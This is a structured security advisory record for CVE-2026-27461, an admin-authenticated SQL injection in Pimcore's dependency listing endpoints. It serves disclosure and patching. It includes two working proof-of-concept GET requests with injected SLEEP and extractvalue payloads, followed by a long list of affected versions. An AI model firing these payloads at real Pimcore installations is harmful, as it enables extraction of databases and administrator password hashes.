@@ -1,0 +1,413 @@
+advisory_id: GHSA-vxg3-v4p6-f3fp
+datasource_id: github_osv/GHSA-vxg3-v4p6-f3fp
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-vxg3-v4p6-f3fp/GHSA-vxg3-v4p6-f3fp.json
+aliases:
+  - CVE-2026-27461
+summary: |
+  Pimcore vulnerable to SQL injection via unsanitized filter value in Dependency Dao RLIKE clause
+  The filter query parameter in the dependency listing endpoints is JSON-decoded and the value field is concatenated directly into RLIKE clauses without sanitization or parameterized queries.
+
+  Affected code in models/Dependency/Dao.php:
+  - getFilterRequiresByPath() lines 90, 95, 100
+  - getFilterRequiredByPath() lines 148, 153, 158
+
+  All 6 locations use direct string concatenation like:
+
+      "AND LOWER(CONCAT(o.path, o.key)) RLIKE '".$value."'"
+
+  Note that $orderBy and $orderDirection in the same methods (lines 75-81) ARE properly whitelist-validated, but $value has zero sanitization.
+
+  Entry points (pimcore/admin-ui-classic-bundle ElementController.php):
+  - GET /admin/element/get-requires-dependencies (line 654)
+  - GET /admin/element/get-required-by-dependencies (line 714)
+
+  The controller JSON-decodes the filter query param and passes $filter['value'] straight to the Dao without any escaping.
+
+  PoC (time-based blind):
+
+      GET /admin/element/get-requires-dependencies?id=1&elementType=document&filter=[{"type":"string","value":"x' OR SLEEP(5)#"}]
+
+  If vulnerable, the response is delayed by ~15 seconds (SLEEP runs 3 times, once per UNION arm in the inner subquery).
+
+  PoC (error-based extraction):
+
+      GET /admin/element/get-requires-dependencies?id=1&elementType=document&filter=[{"type":"string","value":"x' OR extractvalue(1,concat(0x7e,(SELECT version())))#"}]
+
+  Returns the MySQL version string in the error response.
+
+  Requires admin authentication. An attacker with admin panel access can extract the full database including password hashes of other admin users.
+impacted_packages:
+  - purl: pkg:composer/pimcore/pimcore
+    affected_versions: vers:composer/>=12.0.0|<12.3.3
+    fixed_versions: vers:composer/12.3.3
+    affected_packages:
+      - pkg:composer/pimcore/pimcore@12.0.0
+      - pkg:composer/pimcore/pimcore@12.0.1
+      - pkg:composer/pimcore/pimcore@12.0.2
+      - pkg:composer/pimcore/pimcore@12.0.3
+      - pkg:composer/pimcore/pimcore@12.0.4
+      - pkg:composer/pimcore/pimcore@12.1.0
+      - pkg:composer/pimcore/pimcore@12.1.1
+      - pkg:composer/pimcore/pimcore@12.1.2
+      - pkg:composer/pimcore/pimcore@12.1.3
+      - pkg:composer/pimcore/pimcore@12.1.4
+      - pkg:composer/pimcore/pimcore@12.1.5
+      - pkg:composer/pimcore/pimcore@12.2.0
+      - pkg:composer/pimcore/pimcore@12.2.1
+      - pkg:composer/pimcore/pimcore@12.2.2
+      - pkg:composer/pimcore/pimcore@12.2.3
+      - pkg:composer/pimcore/pimcore@12.2.4
+      - pkg:composer/pimcore/pimcore@12.3.0
+      - pkg:composer/pimcore/pimcore@12.3.1
+      - pkg:composer/pimcore/pimcore@12.3.1%2B1
+      - pkg:composer/pimcore/pimcore@12.3.2
+    fixed_packages:
+      - pkg:composer/pimcore/pimcore@12.3.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:composer/pimcore/pimcore
+    affected_versions: vers:composer/<=11.5.14+1
+    fixed_versions:
+    affected_packages:
+      - pkg:composer/pimcore/pimcore@2.2.0
+      - pkg:composer/pimcore/pimcore@2.2.1
+      - pkg:composer/pimcore/pimcore@2.2.2
+      - pkg:composer/pimcore/pimcore@2.3.0
+      - pkg:composer/pimcore/pimcore@3.0.0
+      - pkg:composer/pimcore/pimcore@3.0.1
+      - pkg:composer/pimcore/pimcore@3.0.2
+      - pkg:composer/pimcore/pimcore@3.0.3
+      - pkg:composer/pimcore/pimcore@3.0.4
+      - pkg:composer/pimcore/pimcore@3.0.5
+      - pkg:composer/pimcore/pimcore@3.0.6
+      - pkg:composer/pimcore/pimcore@3.1.0
+      - pkg:composer/pimcore/pimcore@3.1.1
+      - pkg:composer/pimcore/pimcore@4.0.0
+      - pkg:composer/pimcore/pimcore@4.0.1
+      - pkg:composer/pimcore/pimcore@4.1.0
+      - pkg:composer/pimcore/pimcore@4.1.1
+      - pkg:composer/pimcore/pimcore@4.1.2
+      - pkg:composer/pimcore/pimcore@4.1.3
+      - pkg:composer/pimcore/pimcore@4.2.0
+      - pkg:composer/pimcore/pimcore@4.3.0
+      - pkg:composer/pimcore/pimcore@4.3.1
+      - pkg:composer/pimcore/pimcore@4.4.0
+      - pkg:composer/pimcore/pimcore@4.4.1
+      - pkg:composer/pimcore/pimcore@4.4.2
+      - pkg:composer/pimcore/pimcore@4.4.3
+      - pkg:composer/pimcore/pimcore@4.5.0
+      - pkg:composer/pimcore/pimcore@4.6.0
+      - pkg:composer/pimcore/pimcore@4.6.1
+      - pkg:composer/pimcore/pimcore@4.6.2
+      - pkg:composer/pimcore/pimcore@4.6.3
+      - pkg:composer/pimcore/pimcore@4.6.4
+      - pkg:composer/pimcore/pimcore@4.6.5
+      - pkg:composer/pimcore/pimcore@5.0.0-RC
+      - pkg:composer/pimcore/pimcore@5.0.0
+      - pkg:composer/pimcore/pimcore@5.0.1
+      - pkg:composer/pimcore/pimcore@5.0.2
+      - pkg:composer/pimcore/pimcore@5.0.3
+      - pkg:composer/pimcore/pimcore@5.0.4
+      - pkg:composer/pimcore/pimcore@5.1.0-alpha
+      - pkg:composer/pimcore/pimcore@5.1.0
+      - pkg:composer/pimcore/pimcore@5.1.1
+      - pkg:composer/pimcore/pimcore@5.1.2
+      - pkg:composer/pimcore/pimcore@5.1.3
+      - pkg:composer/pimcore/pimcore@5.2.0
+      - pkg:composer/pimcore/pimcore@5.2.1
+      - pkg:composer/pimcore/pimcore@5.2.2
+      - pkg:composer/pimcore/pimcore@5.2.3
+      - pkg:composer/pimcore/pimcore@5.3.0
+      - pkg:composer/pimcore/pimcore@5.3.1
+      - pkg:composer/pimcore/pimcore@5.4.0
+      - pkg:composer/pimcore/pimcore@5.4.1
+      - pkg:composer/pimcore/pimcore@5.4.2
+      - pkg:composer/pimcore/pimcore@5.4.3
+      - pkg:composer/pimcore/pimcore@5.4.4
+      - pkg:composer/pimcore/pimcore@5.5.0
+      - pkg:composer/pimcore/pimcore@5.5.1
+      - pkg:composer/pimcore/pimcore@5.5.2
+      - pkg:composer/pimcore/pimcore@5.5.3
+      - pkg:composer/pimcore/pimcore@5.5.4
+      - pkg:composer/pimcore/pimcore@5.6.0
+      - pkg:composer/pimcore/pimcore@5.6.1
+      - pkg:composer/pimcore/pimcore@5.6.2
+      - pkg:composer/pimcore/pimcore@5.6.3
+      - pkg:composer/pimcore/pimcore@5.6.4
+      - pkg:composer/pimcore/pimcore@5.6.5
+      - pkg:composer/pimcore/pimcore@5.6.6
+      - pkg:composer/pimcore/pimcore@5.7.0
+      - pkg:composer/pimcore/pimcore@5.7.1
+      - pkg:composer/pimcore/pimcore@5.7.2
+      - pkg:composer/pimcore/pimcore@5.7.3
+      - pkg:composer/pimcore/pimcore@5.8.0
+      - pkg:composer/pimcore/pimcore@5.8.1
+      - pkg:composer/pimcore/pimcore@5.8.2
+      - pkg:composer/pimcore/pimcore@5.8.3
+      - pkg:composer/pimcore/pimcore@5.8.4
+      - pkg:composer/pimcore/pimcore@5.8.5
+      - pkg:composer/pimcore/pimcore@5.8.6
+      - pkg:composer/pimcore/pimcore@5.8.7
+      - pkg:composer/pimcore/pimcore@5.8.8
+      - pkg:composer/pimcore/pimcore@5.8.9
+      - pkg:composer/pimcore/pimcore@6.0.0
+      - pkg:composer/pimcore/pimcore@6.0.1
+      - pkg:composer/pimcore/pimcore@6.0.2
+      - pkg:composer/pimcore/pimcore@6.0.3
+      - pkg:composer/pimcore/pimcore@6.0.4
+      - pkg:composer/pimcore/pimcore@6.0.5
+      - pkg:composer/pimcore/pimcore@6.1.0
+      - pkg:composer/pimcore/pimcore@6.1.1
+      - pkg:composer/pimcore/pimcore@6.1.2
+      - pkg:composer/pimcore/pimcore@6.2.0
+      - pkg:composer/pimcore/pimcore@6.2.1
+      - pkg:composer/pimcore/pimcore@6.2.2
+      - pkg:composer/pimcore/pimcore@6.2.3
+      - pkg:composer/pimcore/pimcore@6.3.0
+      - pkg:composer/pimcore/pimcore@6.3.1
+      - pkg:composer/pimcore/pimcore@6.3.2
+      - pkg:composer/pimcore/pimcore@6.3.3
+      - pkg:composer/pimcore/pimcore@6.3.4
+      - pkg:composer/pimcore/pimcore@6.3.5
+      - pkg:composer/pimcore/pimcore@6.3.6
+      - pkg:composer/pimcore/pimcore@6.4.0
+      - pkg:composer/pimcore/pimcore@6.4.1
+      - pkg:composer/pimcore/pimcore@6.4.2
+      - pkg:composer/pimcore/pimcore@6.5.0
+      - pkg:composer/pimcore/pimcore@6.5.1
+      - pkg:composer/pimcore/pimcore@6.5.2
+      - pkg:composer/pimcore/pimcore@6.5.3
+      - pkg:composer/pimcore/pimcore@6.6.0
+      - pkg:composer/pimcore/pimcore@6.6.1
+      - pkg:composer/pimcore/pimcore@6.6.2
+      - pkg:composer/pimcore/pimcore@6.6.3
+      - pkg:composer/pimcore/pimcore@6.6.4
+      - pkg:composer/pimcore/pimcore@6.6.5
+      - pkg:composer/pimcore/pimcore@6.6.6
+      - pkg:composer/pimcore/pimcore@6.6.7
+      - pkg:composer/pimcore/pimcore@6.6.8
+      - pkg:composer/pimcore/pimcore@6.6.9
+      - pkg:composer/pimcore/pimcore@6.6.10
+      - pkg:composer/pimcore/pimcore@6.6.11
+      - pkg:composer/pimcore/pimcore@6.7.0
+      - pkg:composer/pimcore/pimcore@6.7.1
+      - pkg:composer/pimcore/pimcore@6.7.2
+      - pkg:composer/pimcore/pimcore@6.7.3
+      - pkg:composer/pimcore/pimcore@6.8.0
+      - pkg:composer/pimcore/pimcore@6.8.1
+      - pkg:composer/pimcore/pimcore@6.8.2
+      - pkg:composer/pimcore/pimcore@6.8.3
+      - pkg:composer/pimcore/pimcore@6.8.4
+      - pkg:composer/pimcore/pimcore@6.8.5
+      - pkg:composer/pimcore/pimcore@6.8.6
+      - pkg:composer/pimcore/pimcore@6.8.7
+      - pkg:composer/pimcore/pimcore@6.8.8
+      - pkg:composer/pimcore/pimcore@6.8.9
+      - pkg:composer/pimcore/pimcore@6.8.10
+      - pkg:composer/pimcore/pimcore@6.8.11
+      - pkg:composer/pimcore/pimcore@6.8.12
+      - pkg:composer/pimcore/pimcore@6.9.0
+      - pkg:composer/pimcore/pimcore@6.9.1
+      - pkg:composer/pimcore/pimcore@6.9.2
+      - pkg:composer/pimcore/pimcore@6.9.3
+      - pkg:composer/pimcore/pimcore@6.9.4
+      - pkg:composer/pimcore/pimcore@6.9.5
+      - pkg:composer/pimcore/pimcore@6.9.6
+      - pkg:composer/pimcore/pimcore@10.0.0-BETA1
+      - pkg:composer/pimcore/pimcore@10.0.0-BETA2
+      - pkg:composer/pimcore/pimcore@10.0.0-BETA3
+      - pkg:composer/pimcore/pimcore@10.0.0-BETA4
+      - pkg:composer/pimcore/pimcore@10.0.0
+      - pkg:composer/pimcore/pimcore@10.0.1
+      - pkg:composer/pimcore/pimcore@10.0.2
+      - pkg:composer/pimcore/pimcore@10.0.3
+      - pkg:composer/pimcore/pimcore@10.0.4
+      - pkg:composer/pimcore/pimcore@10.0.5
+      - pkg:composer/pimcore/pimcore@10.0.6
+      - pkg:composer/pimcore/pimcore@10.0.7
+      - pkg:composer/pimcore/pimcore@10.0.8
+      - pkg:composer/pimcore/pimcore@10.0.9
+      - pkg:composer/pimcore/pimcore@10.1.0
+      - pkg:composer/pimcore/pimcore@10.1.1
+      - pkg:composer/pimcore/pimcore@10.1.2
+      - pkg:composer/pimcore/pimcore@10.1.3
+      - pkg:composer/pimcore/pimcore@10.1.4
+      - pkg:composer/pimcore/pimcore@10.1.5
+      - pkg:composer/pimcore/pimcore@10.2.0
+      - pkg:composer/pimcore/pimcore@10.2.1
+      - pkg:composer/pimcore/pimcore@10.2.2
+      - pkg:composer/pimcore/pimcore@10.2.3
+      - pkg:composer/pimcore/pimcore@10.2.4
+      - pkg:composer/pimcore/pimcore@10.2.5
+      - pkg:composer/pimcore/pimcore@10.2.6
+      - pkg:composer/pimcore/pimcore@10.2.7
+      - pkg:composer/pimcore/pimcore@10.2.8
+      - pkg:composer/pimcore/pimcore@10.2.9
+      - pkg:composer/pimcore/pimcore@10.2.10
+      - pkg:composer/pimcore/pimcore@10.3.0
+      - pkg:composer/pimcore/pimcore@10.3.1
+      - pkg:composer/pimcore/pimcore@10.3.2
+      - pkg:composer/pimcore/pimcore@10.3.3
+      - pkg:composer/pimcore/pimcore@10.3.4
+      - pkg:composer/pimcore/pimcore@10.3.5
+      - pkg:composer/pimcore/pimcore@10.3.6
+      - pkg:composer/pimcore/pimcore@10.3.7
+      - pkg:composer/pimcore/pimcore@10.4.0
+      - pkg:composer/pimcore/pimcore@10.4.1
+      - pkg:composer/pimcore/pimcore@10.4.2
+      - pkg:composer/pimcore/pimcore@10.4.3
+      - pkg:composer/pimcore/pimcore@10.4.4
+      - pkg:composer/pimcore/pimcore@10.4.5
+      - pkg:composer/pimcore/pimcore@10.4.6
+      - pkg:composer/pimcore/pimcore@10.5.0
+      - pkg:composer/pimcore/pimcore@10.5.1
+      - pkg:composer/pimcore/pimcore@10.5.2
+      - pkg:composer/pimcore/pimcore@10.5.3
+      - pkg:composer/pimcore/pimcore@10.5.4
+      - pkg:composer/pimcore/pimcore@10.5.5
+      - pkg:composer/pimcore/pimcore@10.5.6
+      - pkg:composer/pimcore/pimcore@10.5.7
+      - pkg:composer/pimcore/pimcore@10.5.8
+      - pkg:composer/pimcore/pimcore@10.5.9
+      - pkg:composer/pimcore/pimcore@10.5.10
+      - pkg:composer/pimcore/pimcore@10.5.11
+      - pkg:composer/pimcore/pimcore@10.5.12
+      - pkg:composer/pimcore/pimcore@10.5.13
+      - pkg:composer/pimcore/pimcore@10.5.14
+      - pkg:composer/pimcore/pimcore@10.5.15
+      - pkg:composer/pimcore/pimcore@10.5.16
+      - pkg:composer/pimcore/pimcore@10.5.17
+      - pkg:composer/pimcore/pimcore@10.5.18
+      - pkg:composer/pimcore/pimcore@10.5.19
+      - pkg:composer/pimcore/pimcore@10.5.20
+      - pkg:composer/pimcore/pimcore@10.5.21
+      - pkg:composer/pimcore/pimcore@10.5.22
+      - pkg:composer/pimcore/pimcore@10.5.23
+      - pkg:composer/pimcore/pimcore@10.5.24
+      - pkg:composer/pimcore/pimcore@10.5.25
+      - pkg:composer/pimcore/pimcore@10.6.0
+      - pkg:composer/pimcore/pimcore@10.6.1
+      - pkg:composer/pimcore/pimcore@10.6.2
+      - pkg:composer/pimcore/pimcore@10.6.3
+      - pkg:composer/pimcore/pimcore@10.6.4
+      - pkg:composer/pimcore/pimcore@10.6.5
+      - pkg:composer/pimcore/pimcore@10.6.6
+      - pkg:composer/pimcore/pimcore@10.6.7
+      - pkg:composer/pimcore/pimcore@10.6.8
+      - pkg:composer/pimcore/pimcore@10.6.9
+      - pkg:composer/pimcore/pimcore@11.0.0-ALPHA1
+      - pkg:composer/pimcore/pimcore@11.0.0-ALPHA2
+      - pkg:composer/pimcore/pimcore@11.0.0-ALPHA3
+      - pkg:composer/pimcore/pimcore@11.0.0-ALPHA4
+      - pkg:composer/pimcore/pimcore@11.0.0-ALPHA5
+      - pkg:composer/pimcore/pimcore@11.0.0-ALPHA6
+      - pkg:composer/pimcore/pimcore@11.0.0-ALPHA7
+      - pkg:composer/pimcore/pimcore@11.0.0-ALPHA8
+      - pkg:composer/pimcore/pimcore@11.0.0-BETA1
+      - pkg:composer/pimcore/pimcore@11.0.0-RC1
+      - pkg:composer/pimcore/pimcore@11.0.0-RC2
+      - pkg:composer/pimcore/pimcore@11.0.0
+      - pkg:composer/pimcore/pimcore@11.0.1
+      - pkg:composer/pimcore/pimcore@11.0.2
+      - pkg:composer/pimcore/pimcore@11.0.3
+      - pkg:composer/pimcore/pimcore@11.0.4
+      - pkg:composer/pimcore/pimcore@11.0.5
+      - pkg:composer/pimcore/pimcore@11.0.6
+      - pkg:composer/pimcore/pimcore@11.0.7
+      - pkg:composer/pimcore/pimcore@11.0.8
+      - pkg:composer/pimcore/pimcore@11.0.9
+      - pkg:composer/pimcore/pimcore@11.0.10
+      - pkg:composer/pimcore/pimcore@11.0.11
+      - pkg:composer/pimcore/pimcore@11.0.12
+      - pkg:composer/pimcore/pimcore@11.1.0-RC1
+      - pkg:composer/pimcore/pimcore@11.1.0
+      - pkg:composer/pimcore/pimcore@11.1.1
+      - pkg:composer/pimcore/pimcore@11.1.2
+      - pkg:composer/pimcore/pimcore@11.1.3
+      - pkg:composer/pimcore/pimcore@11.1.4
+      - pkg:composer/pimcore/pimcore@11.1.5
+      - pkg:composer/pimcore/pimcore@11.1.6
+      - pkg:composer/pimcore/pimcore@11.2.0
+      - pkg:composer/pimcore/pimcore@11.2.1
+      - pkg:composer/pimcore/pimcore@11.2.2
+      - pkg:composer/pimcore/pimcore@11.2.3
+      - pkg:composer/pimcore/pimcore@11.2.4
+      - pkg:composer/pimcore/pimcore@11.2.5
+      - pkg:composer/pimcore/pimcore@11.2.6
+      - pkg:composer/pimcore/pimcore@11.2.7
+      - pkg:composer/pimcore/pimcore@11.3.0-RC1
+      - pkg:composer/pimcore/pimcore@11.3.0-RC2
+      - pkg:composer/pimcore/pimcore@11.3.0
+      - pkg:composer/pimcore/pimcore@11.3.1
+      - pkg:composer/pimcore/pimcore@11.3.2
+      - pkg:composer/pimcore/pimcore@11.3.3
+      - pkg:composer/pimcore/pimcore@11.4.0-RC1
+      - pkg:composer/pimcore/pimcore@11.4.0
+      - pkg:composer/pimcore/pimcore@11.4.1
+      - pkg:composer/pimcore/pimcore@11.4.2
+      - pkg:composer/pimcore/pimcore@11.4.3
+      - pkg:composer/pimcore/pimcore@11.4.4
+      - pkg:composer/pimcore/pimcore@11.5.0-RC1
+      - pkg:composer/pimcore/pimcore@11.5.0-RC2
+      - pkg:composer/pimcore/pimcore@11.5.0
+      - pkg:composer/pimcore/pimcore@11.5.1
+      - pkg:composer/pimcore/pimcore@11.5.2
+      - pkg:composer/pimcore/pimcore@11.5.3
+      - pkg:composer/pimcore/pimcore@11.5.4
+      - pkg:composer/pimcore/pimcore@11.5.5
+      - pkg:composer/pimcore/pimcore@11.5.6
+      - pkg:composer/pimcore/pimcore@11.5.7
+      - pkg:composer/pimcore/pimcore@11.5.8
+      - pkg:composer/pimcore/pimcore@11.5.9
+      - pkg:composer/pimcore/pimcore@11.5.10
+      - pkg:composer/pimcore/pimcore@11.5.11
+      - pkg:composer/pimcore/pimcore@11.5.12
+      - pkg:composer/pimcore/pimcore@11.5.13
+      - pkg:composer/pimcore/pimcore@11.5.14
+      - pkg:composer/pimcore/pimcore@11.5.14%2B1
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/pimcore/pimcore
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/pimcore/pimcore
+        commit: 1c3925fbec4895abeb21e5c244a83679c4e4a6f4
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '6.9'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-vxg3-v4p6-f3fp/GHSA-vxg3-v4p6-f3fp.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-89
+references:
+  - url: https://github.com/pimcore/pimcore
+    reference_type:
+    reference_id:
+  - url: https://github.com/pimcore/pimcore/commit/1c3925fbec4895abeb21e5c244a83679c4e4a6f4
+    reference_type:
+    reference_id:
+  - url: https://github.com/pimcore/pimcore/pull/18991
+    reference_type:
+    reference_id:
+  - url: https://github.com/pimcore/pimcore/releases/tag/v12.3.3
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-27461
+    reference_type:
+    reference_id: CVE-2026-27461
+  - url: https://github.com/pimcore/pimcore/security/advisories/GHSA-vxg3-v4p6-f3fp
+    reference_type:
+    reference_id: GHSA-vxg3-v4p6-f3fp
+exploits: []
